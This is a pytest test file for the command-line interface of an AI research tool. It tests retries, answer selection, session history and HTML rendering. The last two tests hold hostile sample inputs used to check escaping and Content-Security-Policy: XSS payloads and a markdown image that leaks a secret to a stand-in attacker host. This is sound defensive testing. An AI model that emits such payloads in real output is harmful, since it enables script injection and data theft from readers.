"""CLI wiring tests.

Hermetic: no API key in env, cwd is a temp dir, Jev routing is offline. Tests
that need a run past model setup stub `_run_pipeline` via the `pipeline` fixture;
the real pipeline is exercised in test_cli_e2e.py.
"""

import asyncio
from types import SimpleNamespace

import pytest
from mrai import cli
from mrai.agent import Answer
from mrai.cli import app
from pydantic_ai import AgentRunError, UnexpectedModelBehavior
from pydantic_ai.exceptions import UsageLimitExceeded
from pydantic_ai.usage import UsageLimits
from typer.testing import CliRunner


@pytest.fixture(autouse=True)
def wide_console(monkeypatch):
    """Rich wraps at the terminal width; keep each message on one line for asserts."""
    monkeypatch.setattr(cli.console, "width", 1000)


def _ai(*argv: str):
    return CliRunner().invoke(app, list(argv))


def _upstream_error(status: int = 504) -> AgentRunError:
    return AgentRunError(
        f"status_code: {status}, model_name: deepseek/deepseek-v4-pro, "
        "body: Upstream idle timeout exceeded"
    )


def _research():
    return SimpleNamespace(all_messages=lambda: [])


def _answer(n: int):
    """A writer result whose Answer is topic tN / title TN / markdown mN."""
    ans = Answer(topic=f"t{n}", title=f"T{n}", markdown=f"m{n}")
    return SimpleNamespace(output=ans, all_messages=lambda: [])


class _ScriptedPipeline:
    """`pipeline(*outcomes)` queues outcomes: each pipeline call raises the next
    one if it is an exception, else returns it as the writer results.
    `histories` records the session history each call received."""

    def __init__(self):
        self.outcomes: list = []
        self.histories: list = []

    def __call__(self, *outcomes):
        self.outcomes.extend(outcomes)

    async def run(self, researcher, writers, query, history, deps, settings):
        self.histories.append(history)
        outcome = self.outcomes.pop(0)
        if isinstance(outcome, BaseException):
            raise outcome
        return _research(), outcome, cli.RunUsage()


@pytest.fixture
def pipeline(cli_hermetic, monkeypatch):
    """Skip model setup and replace the real pipeline with scripted outcomes."""
    script = _ScriptedPipeline()
    monkeypatch.setattr(cli, "build_researcher", lambda *a, **k: (object(), None))
    monkeypatch.setattr(cli, "build_writers", lambda *a, **k: [object()] * 3)
    monkeypatch.setattr(cli, "_run_pipeline", script.run)
    return script


# --- argument handling -------------------------------------------------------


def test_missing_key_exits_gracefully(cli_hermetic):
    result = _ai("--no-memory", "--no-write", "hello world")
    assert result.exit_code == 1
    assert "model setup failed" in result.output


@pytest.mark.parametrize("argv", [[], ["--flash"]])
def test_no_query_shows_help(cli_hermetic, argv):
    result = _ai(*argv)
    assert result.exit_code == 0
    assert "Usage:" in result.output
    assert "model setup failed" not in result.output


def test_version_flag_prints_version(cli_hermetic):
    result = _ai("--version")
    assert result.exit_code == 0
    assert result.output.strip().startswith("mrai ")


def test_sandbox_without_bwrap_says_why(cli_hermetic, monkeypatch):
    monkeypatch.delenv("MRAI_SANDBOXED")
    monkeypatch.setattr(cli.sys, "platform", "linux")
    monkeypatch.setattr(cli.shutil, "which", lambda name: None)
    result = _ai("hello")
    assert result.exit_code == 1
    assert "bubblewrap" in result.output and "--no-sandbox" in result.output


def test_no_sandbox_skips_bwrap(cli_hermetic, monkeypatch):
    monkeypatch.delenv("MRAI_SANDBOXED")
    monkeypatch.setattr(cli, "_enter_sandbox", lambda **k: pytest.fail("sandboxed"))
    assert _ai("--no-sandbox").exit_code == 0  # no query: prints help


# --- picking the final answer ------------------------------------------------


def test_jev_picks_best_candidate(pipeline, monkeypatch):
    monkeypatch.setattr(cli, "select_final_answer", lambda *a, **k: (2, [0.5, 0.7, 0.9], 0.1, None))
    pipeline([_answer(1), _answer(2), _answer(3)])
    result = _ai("--no-write", "hello")
    assert result.exit_code == 0
    assert "3 · T3" in result.output and "0.90" in result.output and "→ chosen" in result.output
    assert "m3" in result.output  # the winner's markdown is printed


def test_without_jev_first_candidate_wins(pipeline, monkeypatch):
    monkeypatch.setattr(cli, "select_final_answer", lambda *a, **k: (None, [], None, "jev is down"))
    pipeline([_answer(1), _answer(2), _answer(3)])
    result = _ai("--no-write", "hello")
    assert result.exit_code == 0
    assert "Jev final selection unavailable" in result.output
    assert "m1" in result.output


def test_single_candidate_skips_jev(pipeline, monkeypatch):
    monkeypatch.setattr(cli, "select_final_answer", pytest.fail)  # must not be called
    pipeline([_answer(1)])
    result = _ai("--no-write", "hello")
    assert result.exit_code == 0
    assert "fewer than two candidates" in result.output
    assert "m1" in result.output


def test_all_candidates_failing_exits(pipeline):
    pipeline([UnexpectedModelBehavior("Tool 'file_info' exceeded max retries")] * 3)
    result = _ai("hello")
    assert result.exit_code == 1
    assert "all candidates failed" in result.output


# --- failures and retries ----------------------------------------------------


def test_upstream_error_is_retried_once(pipeline):
    pipeline(_upstream_error(504), [_answer(1)])
    result = _ai("--no-write", "hello")
    assert result.exit_code == 0
    assert "retrying run once" in result.output
    assert "m1" in result.output


def test_upstream_error_twice_exits_and_logs(pipeline, cli_hermetic):
    pipeline(_upstream_error(504), _upstream_error(529))
    result = _ai("hello")
    assert result.exit_code == 1
    assert "retry failed" in result.output
    assert "retry failed" in (cli_hermetic / ".mrai" / "hello.md").read_text()


def test_non_retryable_error_exits_without_retry(pipeline):
    pipeline(_upstream_error(400))  # a second pipeline call would fail on an empty script
    result = _ai("--no-write", "hello")
    assert result.exit_code == 1
    assert "run failed" in result.output and "retrying" not in result.output


def test_tool_timeout_is_retried_then_exits(pipeline):
    pipeline(cli.ToolCallTimeout("delegate_task"), cli.ToolCallTimeout("delegate_task"))
    result = _ai("hello")
    assert result.exit_code == 1
    assert "retrying run once" in result.output
    assert "tool call exceeded" in result.output


@pytest.mark.parametrize(
    "status,expected", [(504, True), (529, True), (429, True), (400, False), (500, False)]
)
def test_is_retryable(status, expected):
    assert cli._is_retryable(_upstream_error(status)) is expected


def test_is_retryable_sees_chained_cause():
    exc = AgentRunError("model request failed")
    exc.__cause__ = _upstream_error(504)
    assert cli._is_retryable(exc) is True


def test_usage_limit_is_retried_with_double_limit(monkeypatch):
    limits_seen = []

    async def _fake(agent, query, history, deps, view, usage, *, limits, **_):
        limits_seen.append(limits.request_limit)
        if len(limits_seen) == 1:
            raise UsageLimitExceeded("request limit exceeded")
        return "done"

    monkeypatch.setattr(cli, "_run_with_watchdog", _fake)
    run = cli._run_limited(
        object(),
        "q",
        None,
        cli.MemoryDeps(),
        30.0,
        cli.RunUsage(),
        limits=UsageLimits(request_limit=100),
    )
    assert asyncio.run(run) == "done"
    assert limits_seen == [100, 200]


def test_log_failure_writes_stub_but_not_durable_memory(cli_hermetic):
    state = cli_hermetic / ".mrai"
    cli._log_failure(state, "why is the sky blue", "boom — tool timeout", no_write=False)
    assert "boom — tool timeout" in (state / "why-is-the-sky-blue.md").read_text()
    assert not (state / "memories.md").exists()


def test_log_failure_respects_no_write(cli_hermetic):
    cli._log_failure(cli_hermetic / ".mrai", "q", "boom", no_write=True)
    assert not (cli_hermetic / ".mrai").exists()


# --- workspace-bound session history ----------------------------------------


def _workspace_error() -> cli.UserError:
    return cli.UserError(
        "The message history continues in workspace `local:/elsewhere`, but none of "
        "the agent's workspace capabilities recognized it."
    )


def test_history_from_another_workspace_is_dropped(pipeline, monkeypatch):
    monkeypatch.setattr(cli, "_load_history", lambda *a, **k: ["stale"])
    pipeline(_workspace_error(), [_answer(1)])
    result = _ai("--no-write", "hello")
    assert pipeline.histories == [["stale"], None]
    assert "starting fresh" in result.output and result.exit_code == 0


def test_workspace_error_without_history_propagates(pipeline):
    pipeline(_workspace_error())
    result = _ai("hello")
    assert pipeline.histories == [None]  # nothing to drop: no silent retry loop
    assert isinstance(result.exception, cli.UserError)


# --- state dir and renders ---------------------------------------------------


def test_write_render_writes_html_under_state_dir(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    path = cli._write_render(tmp_path / "state", "hello world", "# Hi\n\nSee `x`.")
    assert path == tmp_path / "state" / "renders" / "hello-world.html"
    assert "<h1>Hi</h1>" in path.read_text()
    assert not (tmp_path / ".mrai").exists()  # never written into the (possibly ro) repo


def test_host_path_maps_container_state_dir_to_host(tmp_path, monkeypatch):
    state = tmp_path / "state"
    inside = state / "renders" / "x.html"
    assert cli._host_path(inside, state) == inside  # no mapping outside the container
    monkeypatch.setenv("MRAI_HOST_DIR", "/home/u/.mrai/workspaces/repo-1234abcd")
    assert cli._host_path(inside, state) == cli.Path(
        "/home/u/.mrai/workspaces/repo-1234abcd/renders/x.html"
    )


def test_resolve_mrai_dir_precedence(tmp_path, monkeypatch):
    repo = tmp_path / "repo"
    default = cli.resolve_mrai_dir(None, repo)
    assert default.parent == tmp_path / "mrai-home" / "workspaces"
    assert default.name.startswith("repo-")
    monkeypatch.setenv("MRAI_DIR", str(tmp_path / "env"))
    assert cli.resolve_mrai_dir(None, repo) == tmp_path / "env"
    assert cli.resolve_mrai_dir(tmp_path / "flag", repo) == tmp_path / "flag"  # --dir wins


def test_default_state_dir_differs_per_workspace(tmp_path):
    a = cli.resolve_mrai_dir(None, tmp_path / "x" / "api")
    b = cli.resolve_mrai_dir(None, tmp_path / "y" / "api")
    assert a != b  # same basename, different checkouts: no shared session
    assert a == cli.resolve_mrai_dir(None, tmp_path / "x" / "api")  # stable


def test_render_escapes_html_from_the_answer(tmp_path):
    hostile = "<script>alert(1)</script> <img src=x onerror=alert(1)> [x](javascript:alert(1))"
    html = cli._write_render(tmp_path, "t", hostile).read_text()
    body = html.split("<body>", 1)[1]
    assert "<script>alert" not in body and "&lt;script&gt;" in body
    assert "<img" not in body
    assert 'href="javascript:' not in body


def test_render_csp_allows_only_its_own_script(tmp_path):
    html = cli._write_render(tmp_path, "t", "![](https://evil.example/?d=secret)").read_text()
    csp = html.split('http-equiv="Content-Security-Policy" content="', 1)[1].split('"', 1)[0]
    script = html.rsplit("<script>", 1)[1].split("</script>", 1)[0]
    digest = cli.base64.b64encode(cli.hashlib.sha256(script.encode()).digest()).decode()
    assert f"'sha256-{digest}'" in csp  # the inline script's hash matches what is served
    assert "img-src data:" in csp  # a remote image (data leak on open) is blocked
    assert html.count('integrity="sha512-') == 2  # both CDN files pinned
